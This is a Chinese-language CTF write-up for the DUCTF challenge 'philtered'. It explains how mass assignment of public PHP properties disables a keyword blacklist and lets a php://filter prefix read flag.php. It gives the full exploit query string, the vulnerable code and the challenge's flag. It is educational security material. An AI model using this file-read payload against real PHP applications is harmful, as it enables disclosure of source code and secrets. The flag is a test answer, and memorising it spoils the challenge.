# philtered

## 题目简述

题目给出一个 PHP 文件加载器。`FileLoader::assign_props()` 会把查询参数批量写入对象的公开属性，并允许修改嵌套的 `Config::$data_folder` 与 `Config::$path`。类中虽然有危险词黑名单，但同一个批量赋值入口也暴露了控制黑名单是否执行的 `allow_unsafe` 属性，最终形成任意本地文件读取。

## 解题过程

### 关键机制

关键逻辑可裁剪为：

```php
class Config {
    public $path = 'information.txt';
    public $data_folder = 'data/';
}

class FileLoader {
    public $config;
    public $allow_unsafe = false;
    public $blacklist = ['php', 'filter', 'flag', '..', 'etc', '/', '\\'];

    public function contains_blacklisted_term($value) {
        if (!$this->allow_unsafe) {
            foreach ($this->blacklist as $term) {
                if (stripos($value, $term) !== false) return true;
            }
        }
        return false;
    }

    public function load() {
        return file_get_contents(
            $this->config->data_folder . $this->config->path
        );
    }
}

$loader->assign_props($_GET);
```

PHP 会把 `config[data_folder]=...` 解析为嵌套数组，`assign_props()` 随后把它写进 `Config` 对象。查询参数按下列顺序设置：

```text
allow_unsafe=1
config[data_folder]=php://filter/convert.base64-encode/resource=
config[path]=flag.php
```

先设置 `allow_unsafe=1` 后，后续两个值不再经过黑名单替换。最终加载路径拼接为：

```php
file_get_contents(
    'php://filter/convert.base64-encode/resource=' . 'flag.php'
);
```

对应请求可以写成：

```text
/?allow_unsafe=1&config[data_folder]=php://filter/convert.base64-encode/resource=&config[path]=flag.php
```

响应中的 Base64 文本解码后即可读取 `flag.php`。官方源码中的验证值为：

```text
DUCTF{h0w_d0_y0u_l1k3_y0ur_ph1lters?}
```

## 方法总结

- 核心技巧：利用公开属性的批量赋值关闭安全检查，再用 `php://filter` 把 PHP 源码编码后读出。
- 识别信号：查询参数能映射到对象及其嵌套配置；安全开关和路径配置又同时是公开可写属性。
- 复用要点：审计 mass assignment 时要检查属性之间的依赖和赋值顺序。仅对路径做黑名单没有意义，若攻击者能先关闭检查或控制路径前缀，过滤会被整体绕过。
